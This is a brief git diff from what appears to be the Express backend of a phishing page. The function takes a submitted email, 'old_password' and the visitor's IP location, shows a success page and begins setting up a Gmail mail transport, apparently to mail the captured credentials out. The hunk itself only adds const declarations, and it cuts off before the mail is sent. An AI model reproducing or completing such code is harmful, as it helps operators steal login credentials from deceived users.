@@ -16,10 +16,10 @@ app.set('view engine', 'handlebars');
 
 function sendmail(req,res){
  res.render(__dirname + "/sucess.handlebars")
- email = req.body.email
- password = req.body.old_password
- info_location = req.body.info_location 
- ip = info_location.ipAddress
+ const email = req.body.email
+ const password = req.body.old_password
+ const info_location = req.body.info_location 
+ const ip = info_location.ipAddress
  console.log(ip)
  const transporter = nodemailer.createTransport({
   service: 'gmail',   
